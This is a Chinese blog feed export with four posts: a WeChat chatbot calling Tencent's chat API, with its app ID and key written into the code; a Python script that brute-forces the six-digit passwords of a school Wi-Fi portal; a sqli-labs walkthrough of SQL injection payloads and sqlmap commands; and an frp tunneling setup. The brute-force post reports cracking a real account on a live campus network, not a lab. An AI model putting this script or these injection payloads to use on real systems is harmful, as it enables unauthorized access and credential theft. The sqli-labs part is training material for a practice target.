<h4 id="如有错误或建议，请在评论处指出！"><a href="#如有错误或建议，请在评论处指出！" class="headerlink" title="如有错误或建议，请在评论处指出！"></a>如有错误或建议，请在评论处指出！</h4>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>图灵机器人</tag>
      </tags>
  </entry>
  <entry>
    <title>python+微信+腾讯智能闲聊</title>
    <url>/2020/02/08/python%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E8%B0%83%E7%94%A8%E8%85%BE%E8%AE%AF%E6%99%BA%E8%83%BD%E9%97%B2%E8%81%8A/</url>
    <content><![CDATA[<p><strong>继上一篇调用图灵机器人的玩法后，不满于每天100条的限额，于是！！！又找到了腾讯云产品-智能闲聊，免费！无限额！<br><a href="https://ai.qq.com/">申请智能闲聊</a></strong></p>
<a id="more"></a>
<h2 id="1-构建调用api文件："><a href="#1-构建调用api文件：" class="headerlink" title="1.构建调用api文件："></a>1.构建调用api文件：</h2><p>由于wxpy库没有集成腾讯智能闲聊的api，我们需要自己配置接口，所以会比调用图灵机器人显得麻烦。上python，下面是api.py的内容，主要用于向腾讯云发送请求，并获取回复内容，相当于一个调用api。如下api.py:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">###api.py###</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"> </span><br><span class="line">def curlmd5(src):</span><br><span class="line">    m &#x3D; hashlib.md5(src.encode(&#39;UTF-8&#39;))</span><br><span class="line">    return m.hexdigest().upper()               # 将得到的MD5值所有字符转换成大写</span><br><span class="line"> </span><br><span class="line">def get_params(plus_item):                    #用于返回request需要的data内容</span><br><span class="line">    global params</span><br><span class="line">    t &#x3D; time.time()                                             #请求时间戳（秒级）,（保证签名5分钟有效）</span><br><span class="line">    time_stamp&#x3D;str(int(t))</span><br><span class="line">    nonce_str &#x3D; &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, 10))            # 请求随机字符串，用于保证签名不可预测  </span><br><span class="line">    app_id&#x3D;&#39;2135462408&#39;                              # 修改成自己的id  </span><br><span class="line">    app_key&#x3D;&#39;w3Lv6zsb95T89fay&#39;             # 修改成自己的key  </span><br><span class="line">    params &#x3D; &#123;&#39;app_id&#39;:app_id,</span><br><span class="line">              &#39;question&#39;:plus_item,</span><br><span class="line">              &#39;time_stamp&#39;:time_stamp,</span><br><span class="line">              &#39;nonce_str&#39;:nonce_str,</span><br><span class="line">              &#39;session&#39;:&#39;10000&#39;</span><br><span class="line">             &#125;</span><br><span class="line">    sign_before &#x3D; &#39;&#39;</span><br><span class="line">    for key in sorted(params):                      #要对key排序再拼接</span><br><span class="line">        sign_before +&#x3D; &#39;&#123;&#125;&#x3D;&#123;&#125;&amp;&#39;.format(key,quote(params[key], safe&#x3D;&#39;&#39;))    # 拼接过程需要使用quote函数形成URL编码</span><br><span class="line">    sign_before +&#x3D; &#39;app_key&#x3D;&#123;&#125;&#39;.format(app_key)                                           # 将app_key拼接到sign_before后</span><br><span class="line">    sign &#x3D; curlmd5(sign_before)</span><br><span class="line">    params[&#39;sign&#39;] &#x3D; sign                                 # 对sign_before进行MD5运算</span><br><span class="line">    return params                                              #得到request需要的data内容</span><br><span class="line"> </span><br><span class="line">def get_content(plus_item):</span><br><span class="line">    global payload,r</span><br><span class="line">    url &#x3D; &quot;https:&#x2F;&#x2F;api.ai.qq.com&#x2F;fcgi-bin&#x2F;nlp&#x2F;nlp_textchat&quot;         # 聊天的API地址  </span><br><span class="line">    plus_item &#x3D; plus_item.encode(&#39;utf-8&#39;)</span><br><span class="line">    payload &#x3D; get_params(plus_item)</span><br><span class="line">    r &#x3D; requests.post(url,data&#x3D;payload)                                                 #带参请求api地址</span><br><span class="line">    result&#x3D;r.json()[&quot;data&quot;][&quot;answer&quot;]</span><br><span class="line">    return result                                                                                                #获得返回内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="2-与智能闲聊进行聊天"><a href="#2-与智能闲聊进行聊天" class="headerlink" title="2.与智能闲聊进行聊天"></a>2.与智能闲聊进行聊天</h2><p>终于将前提基础工作完成了，调用api构建好后，调用智能闲聊也就很简单了，调用wxpy库，初始化和构建自动发送、回复函数和上一章都一样。为了简化工作，本例中只实现自动回复功能，也是最常用的功能。依然上ai.py的代码，用于聊天。ai.py如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from wxpy import *</span><br><span class="line">from ai import *                                #导入上一步构建的ai.py文件</span><br><span class="line">bot &#x3D; Bot()</span><br><span class="line">friend &#x3D; bot.friends().search(&#39;AIbot&#39;)[0]</span><br><span class="line"></span><br><span class="line">@bot.register(friend)</span><br><span class="line">def auto_reply(msg):</span><br><span class="line">    a&#x3D;msg.text</span><br><span class="line">    answer&#x3D;get_content(a)</span><br><span class="line">    if answer&#x3D;&#x3D;&#39;&#39;:                                 #防止返回内容为空</span><br><span class="line">        for i in range(2):                     </span><br><span class="line">            time.sleep(2)</span><br><span class="line">            answer&#x3D;get_content(a)</span><br><span class="line">            if answer!&#x3D;&#39;&#39; and answer!&#x3D;&quot;emmmm，我不是很懂你的意思&quot;:</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                answer&#x3D;&quot;emmmm，我不是很懂你的意思&quot;</span><br><span class="line">    return &#39;[Stephen] &#123;&#125; &#39;.format(answer)</span><br><span class="line"></span><br><span class="line">bot.join()</span><br></pre></td></tr></table></figure>
<p>由于访问腾讯api的时候，偶尔会返回空内容，为了避免这种情况，当返回空时，隔2s再请求一次，这般重复3次，如果依然返回空，则自动将返回值设为”emmmm，我不是很懂你的意思”。</p>
<h2 id="3-效果展示："><a href="#3-效果展示：" class="headerlink" title="3.效果展示："></a>3.效果展示：</h2><p>ps：我已将智能闲聊的名字设为了”Stephen”，上图最重要：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA4L1lteElScy5qcGc?x-oss-process=image/format,png" alt="和智能闲聊增进感情"><br>腾讯智能闲聊的智能化程度也挺高，日常闲聊也没有太大问题，有些回答甚至比图灵机器人还要讨喜，各有千秋吧。最关键的是免费！不限额！<br>尽管wxpy功能很强大，但是部分用户无法登陆微信网页版，也就无法体验wxpy的服务了，可以说是很可惜了！</p>
<h4 id="如有错误或建议，请在评论处指出！"><a href="#如有错误或建议，请在评论处指出！" class="headerlink" title="如有错误或建议，请在评论处指出！"></a>如有错误或建议，请在评论处指出！</h4>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>智能闲聊</tag>
      </tags>
  </entry>
  <entry>
    <title>python脚本-暴力破解无线网弱密码</title>
    <url>/2019/04/26/python%E8%84%9A%E6%9C%AC-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%97%A0%E7%BA%BF%E7%BD%91%E5%BC%B1%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p><strong>背景：学校最近重新架设无线网一体化，而初始密码为弱密码（6位数字），下面我们要做的就是通过暴力破解的方式破解弱密码！（所以建议大家以后无论是在注册还是什么情况，都千万不要使用弱密钥）</strong></p>
<a id="more"></a>
<p><strong>攻击过程如下：</strong></p>
<h2 id="1-获取get参数"><a href="#1-获取get参数" class="headerlink" title="1.获取get参数"></a>1.获取get参数</h2><p><strong>在爆破之前我们需要获取一些get参数，这些参数应该包含着我们输入的登陆信息。</strong></p>
<p>登陆无线网前需要在网页上进行身份验证。<br><img src="https://s2.ax1x.com/2019/04/26/Eni5OU.png" alt="验证界面"><br>随便输入一个账号密码，看返回结果是什么。比如输入学号：1122，密码：1231131，运营商选择联通。提示无账号，但是无所谓，毕竟我们的目的在于接下来的抓包环节。抓包看看get的网址，选择我们有用的，比如下图中get参数中包含了我们输入的信息。这很有用，因为这为我们下面的python脚本提供了url。<br><img src="https://s2.ax1x.com/2019/04/26/EniomF.png" alt="获取输入的get参数"><br>看一下回显结果，提示<code>&quot;result&quot;:&quot;0&quot;</code>等信息。<br><img src="https://s2.ax1x.com/2019/04/26/EniTw4.png" alt="验证失败回显内容"><br>我们再输入一个正确的账号密码，将get参数中的user_account和user_password换成正确的（我自己的无线网认证账号密码，账号和密码就不公布了hhhhh），看一下正确登陆后的回显内容。显示<code>&quot;result&quot;:&quot;1&quot;,&quot;认证成功&quot;</code>等信息。<br><img src="https://s2.ax1x.com/2019/04/26/Eni7TJ.png" alt="验证正确回显内容"><br>ok，我们可以根据回显内容的不同来判断是否验证成功。下面就可以进行暴力破解了，只需要选定一个存在的账号，然后穷举6位数字密码的所有可能性，一一验证即可。</p>
<h2 id="python脚本暴力破解"><a href="#python脚本暴力破解" class="headerlink" title="python脚本暴力破解"></a>python脚本暴力破解</h2><p>直接上代码吧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from time import strftime</span><br><span class="line">from itertools import product</span><br><span class="line">from time import sleep</span><br><span class="line">import requests</span><br><span class="line">from requests import post</span><br><span class="line">import re</span><br><span class="line">import threading    #可开启多线程</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line">def fx(iter&#x3D;[&#39;0123456789&#39;]):</span><br><span class="line">  def psgen(x):    #密码生成器，穷举所有的密码可能性，参数x表示密码长度</span><br><span class="line">    for r in iter:</span><br><span class="line">      for repeat in range(x,x+1):</span><br><span class="line">        for ps in product(r,repeat&#x3D;repeat):</span><br><span class="line">          yield &#39;&#39;.join(ps)</span><br><span class="line">  for ps in psgen(6):</span><br><span class="line">    url&#x3D;&#39;http:&#x2F;&#x2F;10.2.5.251:801&#x2F;eportal&#x2F;?c&#x3D;Portal&amp;a&#x3D;login&amp;callback&#x3D;dr1556270398016&amp;login_method&#x3D;1&amp;user_account&#x3D;08xxxx05@unicom&amp;user_password&#x3D;%s&amp;wlan_user_ip&#x3D;10.3.37.27&amp;wlan_user_mac&#x3D;d07e351e9bbe&amp;wlan_ac_ip&#x3D;&amp;wlan_ac_name&#x3D;NAS&amp;jsVersion&#x3D;3.0&amp;_&#x3D;1556270388759&#39;%ps</span><br><span class="line">    try:</span><br><span class="line">      s&#x3D;requests.session()</span><br><span class="line">      rs&#x3D;s.get(url).content.decode(&#39;utf-8&#39;)</span><br><span class="line">      r &#x3D; re.findall(r&#39;认证成功&#39;,rs)        #判断验证结果</span><br><span class="line">      if r: </span><br><span class="line">        with open(&quot;resut.csv&quot;,&quot;a+&quot;) as f:    #存储密码结果到result.csv文件中</span><br><span class="line">          f.write(&#39;密码破解成功结果为：,&#39;+ ps + &#39;,&#39; + strftime(&quot;%c&quot;) + &#39;,&#39; + url+&#39;\n&#39;)</span><br><span class="line">        print(&#39;密码破解成功：&#39;+ps+&#39; ,&#39;+rs)</span><br><span class="line">        break</span><br><span class="line">      else:</span><br><span class="line">        print(ps+&#39;密码不正确&#39;+rs)</span><br><span class="line">    except:</span><br><span class="line">      sleep(1)</span><br><span class="line">      pass</span><br><span class="line">      </span><br><span class="line">fx([&#39;0123456789&#39;])</span><br></pre></td></tr></table></figure>
<p>接下来运行等待结果就ok了。看一下运行过程图：<br><img src="https://s2.ax1x.com/2019/04/26/Enibk9.png" alt="暴力破解过程图"><br>由于一共的可能性有1000000种，而且每一次穷举都要进行一次网络验证，即每一次验证都有网络延时，所以要等上一会儿。大概爆破了一个多小时，终于爆出了正确结果。生成了result.csv文件，查看一下文件内容，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">密码破解成功结果为：,15xxxx,Fri Apr 26 17:28:19 2019,http:&#x2F;&#x2F;10.2.5.251:801&#x2F;eportal&#x2F;?c&#x3D;Portal&amp;a&#x3D;login&amp;callback&#x3D;dr1556270398016&amp;login_method&#x3D;1&amp;user_account&#x3D;08xxxx05@unicom&amp;user_password&#x3D;15xxxx&amp;wlan_user_ip&#x3D;10.3.37.27&amp;wlan_user_mac&#x3D;d07e351e9bbe&amp;wlan_ac_ip&#x3D;&amp;wlan_ac_name&#x3D;NAS&amp;jsVersion&#x3D;3.0&amp;_&#x3D;1556270388759</span><br></pre></td></tr></table></figure>
<p><strong>速度慢可以开启多线程，同时进行测试。结果好很多！</strong></p>
<h4 id="爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！"><a href="#爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！" class="headerlink" title="爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！"></a>爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！</h4>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs(1~22)</title>
    <url>/2019/03/07/sqli-labs(1_22)/</url>
    <content><![CDATA[<p><a href="http://43.247.91.228:84/">sqli-labs网址链接</a></p>
<a id="more"></a>
<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p><strong>方法一：</strong><br>输入?id=1正常显示，输入?id=1’报错，输入?id=1’ and 1=’1，正常显示，得知是字符型注入，<br>爆字段： <code>?id=1&#39; order by 3--+</code><br>查看回显内容：<code>?id=-1‘ union select 1,2,3--+</code><br>爆库名，版本号：<code>？id=-1&#39; union select 1,database(),version()</code><br>爆所有数据库：<code>?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23</code><br>爆表名：<code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;%23</code><br>爆列名：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;%23</code><br>爆数据：<code>?id=-1&#39; union select 1,2,group_concat(id,username,password) from users%23</code></p>
<p><strong>方法二：</strong><br>借助sqlmap软件直接爆破<br>最终payload：<code>./sqlmap.py -u &quot;http://43.247.91.228:84/Less-1/?id=1&quot;  -D security -T users --dump</code><br>得到的数据结果如下：<br><img src="https://s2.ax1x.com/2019/02/27/kTWpG9.png" alt="获取数据"></p>
<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>输入1’，根据报错信息确定输入的内容被原封不动的带入到数据库中，输入?id=1 and 1=1,显示正常，得知是数字型注入，将单引号去掉，其他方法步骤和less-1一样，不再重复了。<br>直接上爆数据payload：<code>?id=-1 union select 1,2,group_concat(id,username,password) from users%23</code><br>sqlmap同样可以直接爆破，payload后的参数和less-1一样。</p>
<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>单引号报错，输入1’，根据报错信息发现输入的内容后有’)，想到应该以 ‘) 来闭合表达式，脑补一下输入1后的sql语言，形如select … from … where id=(‘1’) …，在第一题中id=1的后面加上’）,其他步骤和方法和less-1一样，不再重复了。<br>直接上爆数据payload：<code>?id=-1&#39;) union select 1,2,group_concat(id,username,password) from users%23</code><br>sqlmap同样可以直接爆破，payload后的参数和less-1一样。</p>
<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>双引号报错，输入1’，显示正常，输入1’’,根据报错信息发现输入的内容后有”)，想到应该以 ‘’) 来闭合表达式，脑补一下输入1后的sql语言，形如select … from … where id=(‘’1’’) …，在第一题中id=1的后面加上’’）,其他步骤和方法和less-1一样，不再重复了。<br>直接上爆数据payload：<code>?id=-1&quot;) union select 1,2,group_concat(id,username,password) from users%23</code><br>sqlmap同样可以直接爆破，payload后的参数和less-1一样。</p>
<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>输入之前的内容发现不再显示数据信息，应该是报错注入或者盲注。<br>输入?id=1’报错，根据sql语法错误提示，得知是字符型报错注入。<br>爆库名：<code>?id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23</code><br>爆表名：<code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)%23</code><br>爆列名：<code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e),1)%23</code><br>爆数据：<code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)%23</code><br>sqlmap同样可以直接爆破，payload后的参数和less-1一样。</p>
<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>与第5关类似，只不过这一关使用的是” “的方式闭合字符串，我们只需要将?id=1’ 改为 ?id=1”,后面的参数不变，其余过程不再赘述，和less-5一样。<br>sqlmap同样可以直接爆破，payload后的参数和less-1一样。</p>
<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>输入<code>?id=1&#39;</code>报错，经几次测试后发现只有在后面添加 ‘ 会报错，但是这次后台对报错进行了处理，所有错误都显示语法错误。<br>我们利用单引号进行进一步注入：<code>?id=1&#39; and sleep(3)--+</code>还是报错，猜测是不是过滤了某些字符，<br>测试过滤字符：<code>?id=1&#39; and sleep(3) or 1=&#39;1</code>发现显示正常了，发现后台过滤了的注释字符,通过盲注一步步判断<br>判断数据库的第一个字符是s：<code>?id=1&#39; and ascii(substr((select database()),1,1))=115 and 1=&#39;1</code><br>显示正常，说明数据库的第一个字符的acsll值为115，即为s。<br>一步步尝试，过程比较麻烦，使用脚本比较方便。<br>可直接sqlmap跑一下，payload后的参数和less-1一样。</p>
<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>这一个和less-7差不多，把报错全部过滤了，如果错误就没有返回，正确就返回you are in……，而其注释符没有被过滤，我们就可以利用基于布尔的盲注进行测试：<br>判断数据库的第一个字符是s：<code>?id=1&#39; and ascii(substr((select database()),1,1))=115--+</code><br>一步步尝试，过程比较麻烦，使用脚本比较方便。<br>可直接sqlmap跑一下，payload后的参数和less-1一样。</p>
<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>无论输入什么都是返回相同的内容，报错注入无效了，尝试一下时间盲注：<br>判断是否有注入：<code>?id=1&#39; and sleep(3)--+</code>，停留了3s后刷新，说明存在注入点。<br>其他的和less-7差不多，只是在最后要加上<code>and sleep(3)--+</code>来判断对错。<br>判断数据库的第一个字符是s：<code>?id=1&#39; and ascii(substr((select database()),1,1))=115 and sleep(3)--+</code><br>一步步尝试，过程比较麻烦，使用脚本比较方便。<br>可直接sqlmap跑一下，payload后的参数和less-1一样。</p>
<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>和less-9类似，只是闭合符号变成了 ‘’ ，<br>检查是否存在注入：<code>?id=1&#39;&#39; and sleep(3)--+</code>,停留了3s后刷新，说明存在注入点。其他的和less-9一样了，<br>判断数据库的第一个字符是s：<code>?id=1&#39;&#39; and ascii(substr((select database()),1,1))=115 and sleep(3)--+</code><br>一步步尝试，过程比较麻烦，使用脚本比较方便。<br>可直接sqlmap跑一下，payload后的参数和less-1一样。</p>
<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p><strong>方法一：</strong><br>页面显示变了，不再是get方式传递参数，改为post方式传参，通过尝试发现闭合方式为 ‘ ,先使用万能钥匙登陆，登陆成功。<br><img src="https://s2.ax1x.com/2019/03/05/kjlLIx.png" alt="万能密码登陆"><br>查看是否有注入点，爆字段试试，<br><img src="https://s2.ax1x.com/2019/03/05/kj1ItP.png" alt="爆字段"><br>开始尝试<code>order by 3#</code>提示错误，最终确定<code>order by 2#</code>正常，接着判断回显内容，并爆数据库，<br><img src="https://s2.ax1x.com/2019/03/05/kj3etx.png" alt="爆数据库"><br>爆表名，<br><img src="https://s2.ax1x.com/2019/03/05/kj3zbd.png" alt="爆表名"><br>爆列名，<br><img src="https://s2.ax1x.com/2019/03/05/kjG3FI.png" alt="爆列名"><br>爆数据，<br><img src="https://s2.ax1x.com/2019/03/05/kjGwwj.png" alt="爆数据"><br><strong>方法二：</strong><br>还可以借助sqlmap软件直接爆破<br>最终payload：<code>./sqlmap.py -u &quot;http://localhost/sqli-labs/Less-11/&quot; --data=&quot;uname=*&amp;passwd=*&quot; -D security -T users --dump</code></p>
<h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>根据题目提示闭合方式应该为 “) ，输入万能钥匙，果然登陆成功，<br><img src="https://s2.ax1x.com/2019/03/06/kvJIw4.png" alt="万能钥匙登陆"><br>其他的和less-11一样，只是闭合方式变成了”)，其他的就不赘述了。下面直接上爆数据的截图，<br><img src="https://s2.ax1x.com/2019/03/06/kvYMhn.png" alt="爆数据"><br>也可直接sqlmap跑一下，payload后的参数和less-11一样。</p>
<h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>根据提示闭合方式应该是 ‘) ，但是利用万能钥匙成功登陆后并不显示有用信息，尝试报错注入，竟然成功了。<br><img src="https://s2.ax1x.com/2019/03/06/kvdEdO.png" alt="爆数据库"><br>接着爆表名：<br><img src="https://s2.ax1x.com/2019/03/06/kvdQyt.png" alt="爆表名"><br>接着爆列名：<br><img src="https://s2.ax1x.com/2019/03/06/kvdlOP.png" alt="爆表名"><br>最后爆数据：<br><img src="https://s2.ax1x.com/2019/03/06/kvdDmV.png" alt="爆数据"><br>也可直接sqlmap跑一下，payload后的参数和less-11一样。</p>
<h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>通过尝试发现闭合方式为 “ ，其他方法和less-13一样，不再赘述，下面直接上爆数据的截图，<br><img src="https://s2.ax1x.com/2019/03/06/kvwMh4.png" alt="爆数据"><br>也可直接sqlmap跑一下，payload后的参数和less-11一样。</p>
<h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>根据提示闭合方式为 ‘ ，但无论输入什么，都不再输出任何信息，只能尝试盲注，判断库名的第一个字符是否为s:<br><img src="https://s2.ax1x.com/2019/03/06/kvBFLq.png" alt="判断库名的第一个字符是s"><br>返回登陆成功，说明库名的第一个字符为s，反之则返回登陆失败。<br>接着要一步步尝试，过程比较麻烦，使用脚本比较方便。</p>
<h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>通过尝试发现闭合方式为 “)，其他和less-15一样，只不过改变了闭合方式，直接上判断库名第一个字符是否为s的截图<br><img src="https://s2.ax1x.com/2019/03/06/kvBlO1.png" alt="判断库名的第一个字符为s"><br>返回登陆成功，说明说明库名的第一个字符为s，反之则返回登陆失败。接着要一步步尝试，过程比较麻烦，使用脚本比较方便。</p>
<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>利用万能钥匙登陆，竟然被嘲讽了。发现页面显示重置密码，sql语句应该类似于<code>update table set password=&#39;xxx&#39; where username = &#39;xxx&#39;</code>,需要我们先知道一个username，前几关爆数据的时候username里都有Dumb,我们输入username为Dumb，密码为123456后提示密码更改成功，然后进一步尝试，利用用户名为Dumb在密码处进行注入，<br>在密码栏里写入：<code>1&#39; order by 3#</code> ，报错了。试一下报错注入，<br>在密码栏里输入：<code>1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code>，成果爆出库名，<br>爆表名：密码栏输入<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)#</code>,<br>爆列名：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;),0x7e),1)#</code>。</p>
<p>sqlmap也可以跑出来数据库和表，参数的payload：<code>--data=&quot;uname=admin&amp;passwd=*&quot; -D security -T tables --dump</code>。</p>
<h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>根据提示应该是UA注入，查看源代码，发现输入内容都有审查函数，不存在注入，先试一下UA注入。<br>根据前几关知道有一组数据为admin-admin，所以在username和password处都输入admin，成功登陆，看到提示信息，然后bp抓包后把User-Agent后的内容改为 1’ 运行，报错，说明存在注入，而且源代码里发现很重要的一条语句 **INSERT INTO table_name (‘uagent’,’ip_address’,’username’) VALUES (‘$uagent’,’$IP’,’$uname’)**，需要构造注入语句，还要满足闭合条件,<br>爆库名：<code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br><img src="https://s2.ax1x.com/2019/03/07/kxQFB9.png" alt="修改User-Agent"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
<h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>与less-18类似，根据提示是Referer注入，成功登陆后bp抓包，修改Referer内容。<br>爆库名：<code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br><img src="https://s2.ax1x.com/2019/03/07/kxQg3T.png" alt="修改Referer"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>与less-19类似，根据提示是Cookie注入，成功登陆后bp抓包，修改Cookie内容。<br>爆库名：<code> uname=&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br><img src="https://s2.ax1x.com/2019/03/07/kxNiuV.png" alt="修改Cookie"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
<h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>按less-20的方法成功登陆后，发现页面和less-20有一些不同，<br><img src="https://s2.ax1x.com/2019/03/07/kxN4bT.png" alt="base64编码"><br>uname后的数据加密了，看到加密末尾的 = ，猜测应该是base64编码，到网上将admin进行base64加密，加密结果果然一样。<br>需要把注入字段进行base64加密，其他方法和less-20一样。<br>爆库注入字段：<code> uname=&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br>注入字段base64编码：<code>uname=JyBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9JzE=</code><br>成功登陆后修改Cookie内容，<br><img src="https://s2.ax1x.com/2019/03/07/kxNq2R.png" alt="修改Cookie，并进行base64编码"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>和less-21类似，根据题目提示闭合方式是 “ ，其他方法和less-21一样。<br>爆库注入字段：<code> uname=&quot; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&quot;1</code><br>注入字段base64编码：<code>uname=IiBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9IjE=</code><br>成功登陆后修改Cookie内容，<br><img src="https://s2.ax1x.com/2019/03/07/kxUHw8.png" alt="修改Cookie并进行base64编码"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
<p><strong><em>sqli-labs(1~22)关卡全部完成了，如有错误，欢迎在评论中指出!</em></strong></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>vps+frp实现内网穿透</title>
    <url>/2021/01/28/vps+frp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<p>内网穿透的解决方案有很多，之前我一直在用网云穿提供的内网穿透服务。但是我自己有vps，为什么不自己搭一个内网穿透服务呢？又省钱又稳定又安全。网上教程也很多，通过frp搭建是一个好方法，frp全称fast reverse proxy，是一个开源反向代理，只需一个公网ip即可实现内网穿透。</p>
<p>frp项目地址：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
<a id="more"></a>
<hr>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>客户端：kali(无公网ip)</p>
<p>服务端：ubuntu(公网ip)</p>
<p>测试端：windows(无公网，用来测试客户端和服务端的内网穿透效果)</p>
<p>目标：配置端口映射，使得测试端访问服务端的请求能转发到客户端</p>
<hr>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>通过上述frp项目地址下载压缩包然后解压，文件包含服务端和客户端，其中C表示客户端，S代表服务端:</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210129165722.png" alt="20210129165722"></p>
<hr>
<ul>
<li><p>服务端配置：</p>
<p>因为是服务端配置，所以删掉客户端文件：<code>rm frpc frpc.ini frpc_full.ini</code></p>
<p>然后修改frps.ini：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line">dashboard_user &#x3D; xxx</span><br><span class="line">dashboard_pwd &#x3D; xxx</span><br><span class="line">vhost_http_port &#x3D; 10080</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">bind_port：frp客户端和服务端连接的端口；</span><br><span class="line">dashbaord_port,user,pwd：分别为控制面板的web端口和登录的用户和密码；</span><br><span class="line">vhost_http_port：反向代理http主机端口，则即通过vps_ip:vhost_http_port访问内网web服务</span><br><span class="line">若使用https：vhost_https_port &#x3D; 10443</span><br></pre></td></tr></table></figure>

<p>保存后，在文件所在目录启动运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;frps -c .&#x2F;frps.ini    #前台运行</span><br><span class="line">nohup .&#x2F;frps -c .&#x2F;frps.ini &amp;    #后台运行</span><br></pre></td></tr></table></figure>
<p>终端显示如下信息表示成功启动：</p>
